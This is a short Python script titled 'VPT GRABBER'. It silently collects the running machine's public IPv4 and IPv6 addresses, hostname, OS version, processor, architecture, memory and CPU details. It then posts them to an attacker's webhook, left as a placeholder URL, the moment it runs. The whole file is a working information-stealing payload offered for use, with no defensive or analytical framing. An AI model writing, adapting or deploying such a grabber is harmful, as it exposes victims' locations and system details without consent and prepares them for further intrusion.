import requests, json, platform, psutil

memory = psutil.virtual_memory()

#Gets Infomation
ip=requests.get("https://api.ipify.org/").text
ipv6=requests.get("https://api64.ipify.org/").text
sys = platform.system()
node = platform.node()
ver = platform.version()
mach = platform.machine()
proc = platform.processor()
arch = platform.architecture()[0]

webhook = "webhook-url-here"

#Makes the embed
json_data = {
  "content": "",
  "embeds": [
    {
      "description": f"**IP Infomation**📲\nIP: {ip}\nIPV6: {ipv6}\n\n**System Infomaiton**🖥\nSystem: {sys}\nHostName: {node}\nVersion: {ver}\nMachine: {mach}\nProcessor: {proc}\nArchitecture: {arch}\n\n**Memory Infomation**🧠\nTotal Memory: {memory.total / (1024 ** 3):.2f} GB\nAvailable Memory: {memory.available / (1024 ** 3):.2f} GB\nUsed Memory: {memory.used / (1024 ** 3):.2f} GB\nMemory Percentage Used: {memory.percent}%\n\n**CPU Information**:heart:\nCPU Cores: {psutil.cpu_count(logical=False)} (Physical)\nLogical CPU Cores: {psutil.cpu_count(logical=True)} (Logical)\nCPU Frequency: {psutil.cpu_freq().current} MHz",
      "fields": [],
      "title": "VPT GRABBER"
    }
  ],
  "components": [],
  "actions": {}
}

#Sends the embed
def grab():
    requests.post(webhook, data=json.dumps(json_data), headers={"Content-Type": "application/json", "Content-Disposition": "form-data"})

#Runs the function
grab()